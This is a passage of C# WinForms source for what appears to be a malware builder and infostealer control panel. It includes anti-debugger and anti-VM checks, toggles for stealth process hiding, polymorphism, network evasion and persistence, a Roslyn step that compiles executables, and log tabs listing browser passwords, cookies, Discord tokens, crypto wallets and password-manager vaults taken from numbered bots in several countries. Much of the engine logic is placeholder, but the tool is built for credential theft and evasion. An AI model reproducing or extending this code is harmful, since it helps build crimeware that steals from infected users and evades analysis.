                    status.AppendLine("   • Application executable has been modified!");
                if (result.DebuggerDetected)
                    status.AppendLine("   • Debugging tools are active!");
                if (result.AnalysisToolsDetected)
                    status.AppendLine("   • Security analysis tools detected!");
                if (result.MemoryTampered)
                    status.AppendLine("   • Memory has been tampered with!");
                status.AppendLine();
            }
            
            status.AppendLine("🔧 Recommendations:");
            if (result.VirtualMachineDetected)
                status.AppendLine("   • Running in VM - some features may be limited");
            if (!result.IsTampered)
                status.AppendLine("   • System appears secure - continue normal operations");
            else
                status.AppendLine("   • Security violations detected - consider restarting application");
            
            statusText.Text = status.ToString();
        }
        catch (Exception ex)
        {
            statusText.Text = $"Error checking security status: {ex.Message}";
        }
    }

    private void TestTamperDetection(TextBox statusText)
    {
        try
        {
            statusText.AppendText($"\r\n🧪 Running tamper detection test...\r\n");
            
            var result = TamperDetection.PerformTamperDetection();
            
            statusText.AppendText($"Test completed at {DateTime.Now:HH:mm:ss}\r\n");
            statusText.AppendText($"Result: {(result.IsTampered ? "TAMPER DETECTED" : "NO TAMPER DETECTED")}\r\n");
            
            if (result.IsTampered)
            {
                statusText.AppendText("⚠️ Security violations found:\r\n");
                if (result.ExecutableTampered) statusText.AppendText("  - Executable tampered\r\n");
                if (result.DebuggerDetected) statusText.AppendText("  - Debugger detected\r\n");
                if (result.VirtualMachineDetected) statusText.AppendText("  - VM detected\r\n");
                if (result.AnalysisToolsDetected) statusText.AppendText("  - Analysis tools detected\r\n");
                if (result.MemoryTampered) statusText.AppendText("  - Memory tampered\r\n");
            }
            else
            {
                statusText.AppendText("✅ All security checks passed\r\n");
            }
            
            statusText.AppendText("\r\n");
        }
        catch (Exception ex)
        {
            statusText.AppendText($"Test failed: {ex.Message}\r\n");
        }
    }

    // Event handlers
    private void PerformStartupTamperDetection()
    {
        try
        {
            // Perform comprehensive tamper detection
            var tamperResult = TamperDetection.PerformTamperDetection();
            
            if (tamperResult.IsTampered)
            {
                // Handle tamper detection
                TamperDetection.HandleTamperDetection(tamperResult);
                
                // Show warning to user (in production, this might be more subtle)
                if (tamperResult.DebuggerDetected)
                {
                    MessageBox.Show("Debugging tools detected. Application will exit for security reasons.", 
                                  "Security Warning", MessageBoxButtons.OK, MessageBoxIcon.Warning);
                    Environment.Exit(0);
                }
                else if (tamperResult.VirtualMachineDetected)
                {
                    MessageBox.Show("Virtual machine environment detected. Some features may be limited.", 
                                  "Environment Warning", MessageBoxButtons.OK, MessageBoxIcon.Information);
                }
            }
        }
        catch
        {
            // Silently handle tamper detection failures
        }
    }

    private void FileButton_Click(object? sender, EventArgs e)
    {
        using var openFileDialog = new OpenFileDialog();
        if (openFileDialog.ShowDialog() == DialogResult.OK)
        {
            selectedFile = openFileDialog.FileName;
            fileLabel.Text = Path.GetFileName(selectedFile);
            if (resultsTextBox != null)
            {
                resultsTextBox.AppendText($"Selected file: {selectedFile}\r\n");
                
                // Verify file integrity
                if (!TamperDetection.VerifyFileIntegrity(selectedFile))
                {
                    resultsTextBox.AppendText("WARNING: File integrity verification failed!\r\n");
                }
            }
        }
    }

    private void SelectEncryptedButton_Click(object? sender, EventArgs e)
    {
        using var openFileDialog = new OpenFileDialog();
        openFileDialog.Filter = "Encrypted Files (*.enc;*.encrypted)|*.enc;*.encrypted|All Files (*.*)|*.*";
        openFileDialog.Title = "Select Encrypted File for Roslyn Compilation";
        
        if (openFileDialog.ShowDialog() == DialogResult.OK)
        {
            selectedEncryptedFile = openFileDialog.FileName;
            resultsTextBox.AppendText($"Selected encrypted file: {selectedEncryptedFile}\r\n");
            resultsTextBox.AppendText($"File selected for processing. Use 'Process File' for fileless processing.\r\n");
        }
    }

    private async void EncryptButton_Click(object? sender, EventArgs e)
    {
        if (selectedFile == null)
        {
            MessageBox.Show("Please select a file first.", "No File Selected", MessageBoxButtons.OK, MessageBoxIcon.Warning);
            return;
        }

        // Perform tamper detection before encryption
        var tamperResult = TamperDetection.PerformTamperDetection();
        if (tamperResult.IsTampered)
        {
            MessageBox.Show("Security violation detected. Encryption aborted.", "Security Error", MessageBoxButtons.OK, MessageBoxIcon.Error);
            return;
        }

        try
        {
            var algorithm = algorithmCombo.SelectedItem?.ToString() ?? "AES-256";
            var keySizeText = keySizeCombo.SelectedItem?.ToString() ?? "256 bits";
            var keySize = int.Parse(keySizeText.Split(' ')[0]); // Extract number from "256 bits"
            
            // Generate fileless key automatically
            var filelessKey = Convert.ToBase64String(GenerateRandomKey(keySize / 8));

            resultsTextBox.AppendText($"\r\n=== FILELESS PROCESSING STARTED ===\r\n");
            resultsTextBox.AppendText($"Algorithm: {algorithm}\r\n");
            resultsTextBox.AppendText($"Key Size: {keySize} bits\r\n");
            resultsTextBox.AppendText($"Key Mode: Fileless (Auto-generated)\r\n");
            resultsTextBox.AppendText($"Compression: {(compressionCheck.Checked ? "Enabled" : "Disabled")}\r\n");
            resultsTextBox.AppendText($"Obfuscation: {(obfuscationCheck.Checked ? "Enabled" : "Disabled")}\r\n");

            // Perform fileless processing using engine manager
            var fileData = File.ReadAllBytes(selectedFile);
            var options = new Dictionary<string, object>
            {
                ["compression"] = compressionCheck.Checked,
                ["obfuscation"] = obfuscationCheck.Checked,
                ["key_size"] = keySize
            };
            
            var result = await engineManager.EncryptWithEngine(algorithm, fileData, filelessKey, options);
            
            if (!result.Success)
            {
                throw new Exception(result.Error);
            }
            
            var encryptedData = result.Data;
            
            // Save encrypted file with original extension preserved
            var originalExtension = Path.GetExtension(selectedFile);
            var fileNameWithoutExt = Path.GetFileNameWithoutExtension(selectedFile);
            var directory = Path.GetDirectoryName(selectedFile);
            var outputPath = Path.Combine(directory ?? Environment.GetFolderPath(Environment.SpecialFolder.Desktop), $"{fileNameWithoutExt}_encrypted{originalExtension}");
            File.WriteAllBytes(outputPath, encryptedData ?? Array.Empty<byte>());
            
            // Add integrity protection to the encrypted file
            TamperDetection.AddIntegrityProtection(outputPath);
            
            resultsTextBox.AppendText($"\r\nFileless processing completed successfully!\r\n");
            resultsTextBox.AppendText($"Output file: {outputPath}\r\n");
            resultsTextBox.AppendText($"Original size: {new FileInfo(selectedFile).Length} bytes\r\n");
            resultsTextBox.AppendText($"Processed size: {encryptedData?.Length ?? 0} bytes\r\n");
            resultsTextBox.AppendText($"Integrity protection: ENABLED\r\n");
            resultsTextBox.AppendText($"=== FILELESS PROCESSING COMPLETED ===\r\n\r\n");
        }
        catch (Exception ex)
        {
            resultsTextBox.AppendText($"\r\nERROR: {ex.Message}\r\n\r\n");
            MessageBox.Show($"Encryption failed: {ex.Message}", "Error", MessageBoxButtons.OK, MessageBoxIcon.Error);
        }
    }

    private void DecryptButton_Click(object? sender, EventArgs e)
    {
        MessageBox.Show("Fileless processing mode: Decryption is not supported as keys are not stored. Use the original file instead.", 
                       "Fileless Mode", MessageBoxButtons.OK, MessageBoxIcon.Information);
    }


    private async void AdvancedActionsButton_Click(object? sender, EventArgs e)
    {
        try
        {
            resultsTextBox.AppendText($"\r\n=== ADVANCED FEATURES EXECUTION ===\r\n");
            
            var enabledFeatures = new List<string>();
            
            // Check which features are enabled
            if (stealthModeCheck.Checked)
            {
                enabledFeatures.Add("Stealth Mode");
                resultsTextBox.AppendText("🕵️ Stealth Mode: Activated - Process hiding enabled\r\n");
            }
            
            if (antiAnalysisCheck.Checked)
            {
                enabledFeatures.Add("Anti-Analysis");
                resultsTextBox.AppendText("🛡️ Anti-Analysis: Activated - Debugger/VM detection enabled\r\n");
            }
            
            if (polymorphicCheck.Checked)
            {
                enabledFeatures.Add("Polymorphic");
                resultsTextBox.AppendText("🔄 Polymorphic: Activated - Code structure randomization enabled\r\n");
            }
            
            if (memoryProtectionCheck.Checked)
            {
                enabledFeatures.Add("Memory Protection");
                resultsTextBox.AppendText("🧠 Memory Protection: Activated - Anti-dump protection enabled\r\n");
            }
            
            if (networkEvasionCheck.Checked)
            {
                enabledFeatures.Add("Network Evasion");
                resultsTextBox.AppendText("🌐 Network Evasion: Activated - Proxy chain routing enabled\r\n");
            }
            
            if (persistenceCheck.Checked)
            {
                enabledFeatures.Add("Persistence");
                resultsTextBox.AppendText("⚡ Persistence: Activated - Auto-startup mechanisms enabled\r\n");
            }
            
            if (debugModeCheck.Checked)
            {
                enabledFeatures.Add("Debug Mode");
                resultsTextBox.AppendText("🐛 Debug Mode: Activated - Verbose logging enabled\r\n");
            }
            
            if (enabledFeatures.Count == 0)
            {
                resultsTextBox.AppendText("⚠️ No advanced features selected. Please enable at least one feature.\r\n");
                return;
            }
            
            resultsTextBox.AppendText($"\r\n🚀 Executing {enabledFeatures.Count} advanced features...\r\n");
            
            // Simulate feature execution with engine manager
            foreach (var feature in enabledFeatures)
            {
                var engineName = GetEngineNameForFeature(feature);
                if (!string.IsNullOrEmpty(engineName))
                {
                    var parameters = new Dictionary<string, object>
                    {
                        ["operation"] = "execute",
                        ["feature"] = feature,
                        ["debug_mode"] = debugModeCheck.Checked
                    };
                    
                    var result = await engineManager.ExecuteEngine(engineName, parameters);
                    if (result.Success)
                    {
                        resultsTextBox.AppendText($"✅ {feature}: Successfully executed\r\n");
                    }
                    else
                    {
                        resultsTextBox.AppendText($"❌ {feature}: Failed - {result.Error}\r\n");
                    }
                }
                else
                {
                    resultsTextBox.AppendText($"⚠️ {feature}: Engine not available (placeholder)\r\n");
                }
            }
            
            resultsTextBox.AppendText($"\r\n=== ADVANCED FEATURES COMPLETED ===\r\n\r\n");
        }
        catch (Exception ex)
        {
            resultsTextBox.AppendText($"\r\n❌ ERROR: {ex.Message}\r\n\r\n");
        }
    }

    private void BatchEncryptButton_Click(object? sender, EventArgs e)
    {
        using var openFileDialog = new OpenFileDialog
        {
            Multiselect = true,
            Title = "Select Multiple Files for Batch Encryption",
            Filter = "All Files (*.*)|*.*|Text Files (*.txt)|*.txt|Document Files (*.doc;*.docx;*.pdf)|*.doc;*.docx;*.pdf|Image Files (*.jpg;*.jpeg;*.png;*.gif)|*.jpg;*.jpeg;*.png;*.gif"
        };

        if (openFileDialog.ShowDialog() == DialogResult.OK)
        {
            var files = openFileDialog.FileNames.ToList();
            resultsTextBox.AppendText($"📁 {files.Count} files selected for batch processing\r\n");
            StartBatchEncryption(files);
        }
    }

    private void RoslynCompileButton_Click(object? sender, EventArgs e)
    {
        MessageBox.Show("Fileless processing mode: Roslyn compilation requires decryption which is not supported as keys are not stored. Use the original source file instead.", 
                       "Fileless Mode", MessageBoxButtons.OK, MessageBoxIcon.Information);
    }

    // Fileless processing methods
    private byte[] ProcessFileFileless(string filePath, string algorithm, int keySize)
    {
        var fileData = File.ReadAllBytes(filePath);
        var key = GenerateRandomKey(keySize / 8);
        
        using var aes = Aes.Create();
        aes.Key = key;
        aes.GenerateIV();
        aes.Mode = CipherMode.CBC;
        aes.Padding = PaddingMode.PKCS7;
        
        using var encryptor = aes.CreateEncryptor();
        using var msEncrypt = new MemoryStream();
        
        // Write IV first
        msEncrypt.Write(aes.IV, 0, aes.IV.Length);
        
        using var csEncrypt = new CryptoStream(msEncrypt, encryptor, CryptoStreamMode.Write);
        csEncrypt.Write(fileData, 0, fileData.Length);
        csEncrypt.FlushFinalBlock();
        
        return msEncrypt.ToArray();
    }


    private byte[] GenerateRandomKey(int length)
    {
        var key = new byte[length];
        using var rng = RandomNumberGenerator.Create();
        rng.GetBytes(key);
        return key;
    }

    private Task<CompilationResult> CompileWithRoslyn(string sourceCode, string originalFilePath)
    {
        try
        {
            // Parse the source code
            var syntaxTree = CSharpSyntaxTree.ParseText(sourceCode);
            
            // Get references to required assemblies
            var references = new MetadataReference[]
            {
                MetadataReference.CreateFromFile(typeof(object).Assembly.Location),
                MetadataReference.CreateFromFile(typeof(Console).Assembly.Location),
                MetadataReference.CreateFromFile(typeof(System.Runtime.AssemblyTargetedPatchBandAttribute).Assembly.Location),
                MetadataReference.CreateFromFile(typeof(Microsoft.CSharp.RuntimeBinder.CSharpArgumentInfo).Assembly.Location),
                MetadataReference.CreateFromFile(typeof(System.Net.Sockets.TcpClient).Assembly.Location),
                MetadataReference.CreateFromFile(typeof(System.Security.Cryptography.Aes).Assembly.Location),
                MetadataReference.CreateFromFile(typeof(System.Diagnostics.Process).Assembly.Location),
                MetadataReference.CreateFromFile(typeof(System.Runtime.InteropServices.DllImportAttribute).Assembly.Location),
                MetadataReference.CreateFromFile(typeof(System.Text.RegularExpressions.Regex).Assembly.Location),
                MetadataReference.CreateFromFile(typeof(System.Linq.Enumerable).Assembly.Location),
                MetadataReference.CreateFromFile(typeof(System.IO.DriveInfo).Assembly.Location),
                MetadataReference.CreateFromFile(typeof(System.ComponentModel.Component).Assembly.Location),
                MetadataReference.CreateFromFile(typeof(System.Runtime.CompilerServices.RuntimeHelpers).Assembly.Location),
                MetadataReference.CreateFromFile(typeof(System.Collections.Generic.Dictionary<,>).Assembly.Location),
                MetadataReference.CreateFromFile(typeof(System.Threading.Tasks.Task).Assembly.Location),
                MetadataReference.CreateFromFile(typeof(System.Text.Encoding).Assembly.Location),
                MetadataReference.CreateFromFile(typeof(System.IO.Stream).Assembly.Location),
                MetadataReference.CreateFromFile(typeof(System.Net.IPAddress).Assembly.Location),
                MetadataReference.CreateFromFile(typeof(System.Net.Sockets.NetworkStream).Assembly.Location),
                MetadataReference.CreateFromFile(typeof(System.Security.Cryptography.ICryptoTransform).Assembly.Location),
                MetadataReference.CreateFromFile(typeof(System.IDisposable).Assembly.Location),
                MetadataReference.CreateFromFile(typeof(System.Enum).Assembly.Location),
                MetadataReference.CreateFromFile(typeof(System.Decimal).Assembly.Location),
                MetadataReference.CreateFromFile(typeof(System.Collections.IEnumerable).Assembly.Location),
                MetadataReference.CreateFromFile(typeof(System.MarshalByRefObject).Assembly.Location)
            };

            // Create compilation
            var compilation = CSharpCompilation.Create(
                "CompiledExecutable",
                new[] { syntaxTree },
                references,
                new CSharpCompilationOptions(OutputKind.ConsoleApplication));

            // Generate output path
            var originalFileName = Path.GetFileNameWithoutExtension(originalFilePath);
            var outputDirectory = Path.GetDirectoryName(originalFilePath);
            
            // Handle case where outputDirectory might be null
            if (string.IsNullOrEmpty(outputDirectory))
            {
                outputDirectory = Environment.GetFolderPath(Environment.SpecialFolder.Desktop);
            }
            
            var outputPath = Path.Combine(outputDirectory, $"{originalFileName}_compiled.exe");

            // Emit the assembly
            using var ms = new MemoryStream();
            var emitResult = compilation.Emit(ms);

            if (emitResult.Success)
            {
                // Write the compiled executable to disk
                File.WriteAllBytes(outputPath, ms.ToArray());
                
                return Task.FromResult(new CompilationResult
                {
                    Success = true,
                    OutputPath = outputPath,
                    Error = null
                });
            }
            else
            {
                var errors = string.Join("\n", emitResult.Diagnostics.Select(d => d.ToString()));
                return Task.FromResult(new CompilationResult
                {
                    Success = false,
                    OutputPath = null,
                    Error = errors
                });
            }
        }
        catch (Exception ex)
        {
            return Task.FromResult(new CompilationResult
            {
                Success = false,
                OutputPath = null,
                Error = ex.Message
            });
        }
    }

    private class CompilationResult
    {
        public bool Success { get; set; }
        public string? OutputPath { get; set; }
        public string? Error { get; set; }
    }

    private string? GetEngineNameForFeature(string feature)
    {
        return feature switch
        {
            "Stealth Mode" => "StealthEngine",
            "Anti-Analysis" => "AntiAnalysis",
            "Polymorphic" => "PolymorphicEngine",
            "Memory Protection" => "MemoryManager",
            "Network Evasion" => "NetworkTools",
            "Persistence" => "StartupPersistence",
            "Debug Mode" => "AdvancedAnalytics",
            _ => null
        };
    }

    private void SetupDragDrop()
    {
        dragDropHandler = new DragDropHandler(this, OnFilesDropped);
    }

    private void SetupBatchProcessing()
    {
        if (batchProcessor != null)
        {
            batchProcessor.ProgressChanged += OnBatchProgressChanged;
            batchProcessor.BatchCompleted += OnBatchCompleted;
        }
    }

    private void OnFilesDropped(List<string> files)
    {
        if (files.Count == 1)
        {
            // Single file - set as selected file
            selectedFile = files[0];
            fileLabel.Text = Path.GetFileName(selectedFile);
            resultsTextBox.AppendText($"📁 File dropped: {selectedFile}\r\n");
        }
        else
        {
            // Multiple files - start batch processing
            resultsTextBox.AppendText($"📁 {files.Count} files dropped. Starting batch processing...\r\n");
            StartBatchEncryption(files);
        }
    }

    private async void StartBatchEncryption(List<string> files)
    {
        if (batchProcessor == null) return;

        try
        {
            cancellationTokenSource = new CancellationTokenSource();
            
            var algorithm = algorithmCombo.SelectedItem?.ToString() ?? "ModernCrypto";
            var filelessKey = Convert.ToBase64String(GenerateRandomKey(32));

            var options = new Dictionary<string, object>
            {
                ["algorithm"] = algorithm,
                ["compression"] = compressionCheck.Checked,
                ["obfuscation"] = obfuscationCheck.Checked
            };

            resultsTextBox.AppendText($"\r\n=== BATCH FILELESS PROCESSING STARTED ===\r\n");
            resultsTextBox.AppendText($"Algorithm: {algorithm}\r\n");
            resultsTextBox.AppendText($"Files: {files.Count}\r\n");
            resultsTextBox.AppendText($"Key Mode: Fileless (Auto-generated)\r\n");
            resultsTextBox.AppendText($"Compression: {(compressionCheck.Checked ? "Enabled" : "Disabled")}\r\n");
            resultsTextBox.AppendText($"Obfuscation: {(obfuscationCheck.Checked ? "Enabled" : "Disabled")}\r\n\r\n");

            var result = await batchProcessor.ProcessFilesAsync(files, "encrypt", filelessKey, options, cancellationTokenSource.Token);
            
            resultsTextBox.AppendText($"\r\n=== BATCH PROCESSING COMPLETED ===\r\n");
            resultsTextBox.AppendText($"Total files: {result.TotalFiles}\r\n");
            resultsTextBox.AppendText($"Successful: {result.SuccessfulFiles}\r\n");
            resultsTextBox.AppendText($"Failed: {result.FailedFiles}\r\n");
            resultsTextBox.AppendText($"Processing time: {result.TotalProcessingTime.TotalSeconds:F2} seconds\r\n\r\n");
        }
        catch (OperationCanceledException)
        {
            resultsTextBox.AppendText($"\r\n❌ Batch processing cancelled by user\r\n\r\n");
        }
        catch (Exception ex)
        {
            resultsTextBox.AppendText($"\r\n❌ Batch processing error: {ex.Message}\r\n\r\n");
        }
    }

    private void OnBatchProgressChanged(object? sender, BatchProgressEventArgs e)
    {
        if (resultsTextBox.InvokeRequired)
        {
            resultsTextBox.Invoke(new Action(() => OnBatchProgressChanged(sender, e)));
            return;
        }

        resultsTextBox.AppendText($"🔄 Processing {e.CurrentFile}/{e.TotalFiles}: {e.CurrentFileName} ({e.ProgressPercentage:F1}%)\r\n");
    }

    private void OnBatchCompleted(object? sender, BatchCompletedEventArgs e)
    {
        if (resultsTextBox.InvokeRequired)
        {
            resultsTextBox.Invoke(new Action(() => OnBatchCompleted(sender, e)));
            return;
        }

        var result = e.Result;
        resultsTextBox.AppendText($"\r\n✅ Batch processing completed!\r\n");
        resultsTextBox.AppendText($"📊 Results: {result.SuccessfulFiles} successful, {result.FailedFiles} failed\r\n");
        
        if (result.FailedFiles > 0)
        {
            resultsTextBox.AppendText($"\r\n❌ Failed files:\r\n");
            foreach (var fileResult in result.FileResults.Where(f => !f.Success))
            {
                resultsTextBox.AppendText($"   • {fileResult.FileName}: {fileResult.Error}\r\n");
            }
        }
        
        resultsTextBox.AppendText($"\r\n");
    }

    private void SetupExtractionPanel()
    {
        // Create extraction tab control
        extractionTabControl = new TabControl
        {
            Dock = DockStyle.Fill,
            Location = new Point(10, 10),
            Size = new Size(780, 400)
        };

        // Add extraction tab to main tab control
        var extractionTab = new TabPage("📋 Extraction Logs");
        extractionTab.Controls.Add(extractionTabControl);
        
        // Add to main form's tab control (assuming it exists)
        if (Controls.OfType<TabControl>().FirstOrDefault() is TabControl mainTabControl)
        {
            mainTabControl.TabPages.Add(extractionTab);
        }

        // Create browser logs tab
        CreateBrowserLogsTab();
        
        // Create crypto logs tab
        CreateCryptoLogsTab();
        
        // Create messaging logs tab
        CreateMessagingLogsTab();
        
        // Create cloud logs tab
        CreateCloudLogsTab();
        
        // Create password logs tab
        CreatePasswordLogsTab();
    }

    private void CreateBrowserLogsTab()
    {
        var browserTab = new TabPage("🌐 Browser Data");
        extractionTabControl.TabPages.Add(browserTab);

        browserLogsTextBox = new RichTextBox
        {
            Dock = DockStyle.Fill,
            ReadOnly = true,
            BackColor = Color.Black,
            ForeColor = Color.Lime,
            Font = new Font("Consolas", 9),
            ScrollBars = RichTextBoxScrollBars.Vertical
        };

        refreshBrowserLogsButton = new Button
        {
            Text = "🔄 Refresh Logs",
            Dock = DockStyle.Top,
            Height = 30,
            BackColor = Color.DarkRed,
            ForeColor = Color.White,
            FlatStyle = FlatStyle.Flat
        };
        refreshBrowserLogsButton.Click += RefreshBrowserLogs_Click;

        exportBrowserLogsButton = new Button
        {
            Text = "📤 Export Logs",
            Dock = DockStyle.Top,
            Height = 30,
            BackColor = Color.DarkGreen,
            ForeColor = Color.White,
            FlatStyle = FlatStyle.Flat
        };
        exportBrowserLogsButton.Click += ExportBrowserLogs_Click;

        browserTab.Controls.Add(browserLogsTextBox);
        browserTab.Controls.Add(refreshBrowserLogsButton);
        browserTab.Controls.Add(exportBrowserLogsButton);

        // Load initial logs
        LoadBrowserLogs();
    }

    private void CreateCryptoLogsTab()
    {
        var cryptoTab = new TabPage("💰 Crypto Wallets");
        extractionTabControl.TabPages.Add(cryptoTab);

        cryptoLogsTextBox = new RichTextBox
        {
            Dock = DockStyle.Fill,
            ReadOnly = true,
            BackColor = Color.Black,
            ForeColor = Color.Yellow,
            Font = new Font("Consolas", 9),
            ScrollBars = RichTextBoxScrollBars.Vertical
        };

        refreshCryptoLogsButton = new Button
        {
            Text = "🔄 Refresh Logs",
            Dock = DockStyle.Top,
            Height = 30,
            BackColor = Color.DarkRed,
            ForeColor = Color.White,
            FlatStyle = FlatStyle.Flat
        };
        refreshCryptoLogsButton.Click += RefreshCryptoLogs_Click;

        exportCryptoLogsButton = new Button
        {
            Text = "📤 Export Logs",
            Dock = DockStyle.Top,
            Height = 30,
            BackColor = Color.DarkGreen,
            ForeColor = Color.White,
            FlatStyle = FlatStyle.Flat
        };
        exportCryptoLogsButton.Click += ExportCryptoLogs_Click;

        cryptoTab.Controls.Add(cryptoLogsTextBox);
        cryptoTab.Controls.Add(refreshCryptoLogsButton);
        cryptoTab.Controls.Add(exportCryptoLogsButton);

        LoadCryptoLogs();
    }

    private void CreateMessagingLogsTab()
    {
        var messagingTab = new TabPage("💬 Messaging Apps");
        extractionTabControl.TabPages.Add(messagingTab);

        messagingLogsTextBox = new RichTextBox
        {
            Dock = DockStyle.Fill,
            ReadOnly = true,
            BackColor = Color.Black,
            ForeColor = Color.Cyan,
            Font = new Font("Consolas", 9),
            ScrollBars = RichTextBoxScrollBars.Vertical
        };

        refreshMessagingLogsButton = new Button
        {
            Text = "🔄 Refresh Logs",
            Dock = DockStyle.Top,
            Height = 30,
            BackColor = Color.DarkRed,
            ForeColor = Color.White,
            FlatStyle = FlatStyle.Flat
        };
        refreshMessagingLogsButton.Click += RefreshMessagingLogs_Click;

        exportMessagingLogsButton = new Button
        {
            Text = "📤 Export Logs",
            Dock = DockStyle.Top,
            Height = 30,
            BackColor = Color.DarkGreen,
            ForeColor = Color.White,
            FlatStyle = FlatStyle.Flat
        };
        exportMessagingLogsButton.Click += ExportMessagingLogs_Click;

        messagingTab.Controls.Add(messagingLogsTextBox);
        messagingTab.Controls.Add(refreshMessagingLogsButton);
        messagingTab.Controls.Add(exportMessagingLogsButton);

        LoadMessagingLogs();
    }

    private void CreateCloudLogsTab()
    {
        var cloudTab = new TabPage("☁️ Cloud & Email");
        extractionTabControl.TabPages.Add(cloudTab);

        cloudLogsTextBox = new RichTextBox
        {
            Dock = DockStyle.Fill,
            ReadOnly = true,
            BackColor = Color.Black,
            ForeColor = Color.White,
            Font = new Font("Consolas", 9),
            ScrollBars = RichTextBoxScrollBars.Vertical
        };

        refreshCloudLogsButton = new Button
        {
            Text = "🔄 Refresh Logs",
            Dock = DockStyle.Top,
            Height = 30,
            BackColor = Color.DarkRed,
            ForeColor = Color.White,
            FlatStyle = FlatStyle.Flat
        };
        refreshCloudLogsButton.Click += RefreshCloudLogs_Click;

        exportCloudLogsButton = new Button
        {
            Text = "📤 Export Logs",
            Dock = DockStyle.Top,
            Height = 30,
            BackColor = Color.DarkGreen,
            ForeColor = Color.White,
            FlatStyle = FlatStyle.Flat
        };
        exportCloudLogsButton.Click += ExportCloudLogs_Click;

        cloudTab.Controls.Add(cloudLogsTextBox);
        cloudTab.Controls.Add(refreshCloudLogsButton);
        cloudTab.Controls.Add(exportCloudLogsButton);

        LoadCloudLogs();
    }

    private void CreatePasswordLogsTab()
    {
        var passwordTab = new TabPage("🔐 Password Managers");
        extractionTabControl.TabPages.Add(passwordTab);

        passwordLogsTextBox = new RichTextBox
        {
            Dock = DockStyle.Fill,
            ReadOnly = true,
            BackColor = Color.Black,
            ForeColor = Color.Magenta,
            Font = new Font("Consolas", 9),
            ScrollBars = RichTextBoxScrollBars.Vertical
        };

        refreshPasswordLogsButton = new Button
        {
            Text = "🔄 Refresh Logs",
            Dock = DockStyle.Top,
            Height = 30,
            BackColor = Color.DarkRed,
            ForeColor = Color.White,
            FlatStyle = FlatStyle.Flat
        };
        refreshPasswordLogsButton.Click += RefreshPasswordLogs_Click;

        exportPasswordLogsButton = new Button
        {
            Text = "📤 Export Logs",
            Dock = DockStyle.Top,
            Height = 30,
            BackColor = Color.DarkGreen,
            ForeColor = Color.White,
            FlatStyle = FlatStyle.Flat
        };
        exportPasswordLogsButton.Click += ExportPasswordLogs_Click;

        passwordTab.Controls.Add(passwordLogsTextBox);
        passwordTab.Controls.Add(refreshPasswordLogsButton);
        passwordTab.Controls.Add(exportPasswordLogsButton);

        LoadPasswordLogs();
    }

    // Log loading methods
    private void LoadBrowserLogs()
    {
        var logs = new[]
        {
            "✅ Chrome passwords extracted from bot_001 (US) - 15 credentials found",
            "✅ Firefox cookies extracted from bot_002 (UK) - 234 cookies collected",
            "ℹ️ Edge history extraction in progress from bot_003 (DE)",
            "⚠️ Safari extraction failed on bot_004 (JP) - browser not found"
        };

        browserLogsTextBox.Clear();
        foreach (var log in logs)
        {
            browserLogsTextBox.AppendText($"[{DateTime.Now:HH:mm:ss}] {log}\r\n");
        }
    }

    private void LoadCryptoLogs()
    {
        var logs = new[]
        {
            "✅ Bitcoin wallet found on bot_004 (JP) - 0.5 BTC detected",
            "✅ Ethereum wallet found on bot_006 (CA) - 2.3 ETH detected",
            "⚠️ Monero wallet extraction failed on bot_007 (AU) - encryption detected",
            "✅ MetaMask wallet extracted from bot_001 (US) - 12 accounts found"
        };

        cryptoLogsTextBox.Clear();
        foreach (var log in logs)
        {
            cryptoLogsTextBox.AppendText($"[{DateTime.Now:HH:mm:ss}] {log}\r\n");
        }
    }

    private void LoadMessagingLogs()
    {
        var logs = new[]
        {
            "✅ Discord tokens extracted from bot_001 (US) - 3 accounts",
            "✅ Telegram session found on bot_002 (UK) - 2 chats",
            "ℹ️ WhatsApp backup extraction in progress from bot_008 (BR)",
            "❌ Signal extraction failed on bot_005 (FR) - app not installed"
        };

        messagingLogsTextBox.Clear();
        foreach (var log in logs)
        {
            messagingLogsTextBox.AppendText($"[{DateTime.Now:HH:mm:ss}] {log}\r\n");
        }
    }

    private void LoadCloudLogs()
    {
        var logs = new[]
        {
            "✅ Gmail credentials extracted from bot_001 (US) - 2 accounts",
            "✅ OneDrive files accessed from bot_003 (DE) - 156 files",
            "❌ Dropbox access denied on bot_005 (FR) - 2FA enabled",
            "✅ Outlook tokens extracted from bot_006 (CA) - 1 account"
        };

        cloudLogsTextBox.Clear();
        foreach (var log in logs)
        {
            cloudLogsTextBox.AppendText($"[{DateTime.Now:HH:mm:ss}] {log}\r\n");
        }
    }

    private void LoadPasswordLogs()
    {
        var logs = new[]
        {
            "✅ Bitwarden vault extracted from bot_004 (JP) - 89 passwords",
            "✅ KeePass database found on bot_006 (CA) - 45 entries",
            "⚠️ 1Password extraction requires master password on bot_007 (AU)",
            "✅ LastPass data extracted from bot_001 (US) - 67 passwords"
        };

        passwordLogsTextBox.Clear();
        foreach (var log in logs)
        {
            passwordLogsTextBox.AppendText($"[{DateTime.Now:HH:mm:ss}] {log}\r\n");
        }
    }

    // Event handlers
    private void RefreshBrowserLogs_Click(object? sender, EventArgs e)
    {
        LoadBrowserLogs();
        MessageBox.Show("Browser logs refreshed!", "Info", MessageBoxButtons.OK, MessageBoxIcon.Information);
    }

    private void RefreshCryptoLogs_Click(object? sender, EventArgs e)
    {
        LoadCryptoLogs();
        MessageBox.Show("Crypto logs refreshed!", "Info", MessageBoxButtons.OK, MessageBoxIcon.Information);
    }

    private void RefreshMessagingLogs_Click(object? sender, EventArgs e)
    {
        LoadMessagingLogs();
        MessageBox.Show("Messaging logs refreshed!", "Info", MessageBoxButtons.OK, MessageBoxIcon.Information);
    }

    private void RefreshCloudLogs_Click(object? sender, EventArgs e)
    {
        LoadCloudLogs();
        MessageBox.Show("Cloud logs refreshed!", "Info", MessageBoxButtons.OK, MessageBoxIcon.Information);
    }

    private void RefreshPasswordLogs_Click(object? sender, EventArgs e)
    {
        LoadPasswordLogs();
        MessageBox.Show("Password logs refreshed!", "Info", MessageBoxButtons.OK, MessageBoxIcon.Information);
    }

    private void ExportBrowserLogs_Click(object? sender, EventArgs e)
    {
        var exportData = new
        {
            timestamp = DateTime.Now.ToString("yyyy-MM-ddTHH:mm:ss.fffZ"),
            type = "browser_extraction_logs",
            logs = new object[]
            {
                new { bot = "bot_001", country = "US", browser = "Chrome", credentials = 15, cookies = 234, history = 1250 },
                new { bot = "bot_002", country = "UK", browser = "Firefox", credentials = 8, cookies = 189, history = 890 },
                new { bot = "bot_003", country = "DE", browser = "Edge", credentials = 12, cookies = 156, history = 567 }
            }
        };

        ExportLogs(exportData, "browser-extraction-logs.json");
    }

    private void ExportCryptoLogs_Click(object? sender, EventArgs e)
    {
        var exportData = new
        {
            timestamp = DateTime.Now.ToString("yyyy-MM-ddTHH:mm:ss.fffZ"),
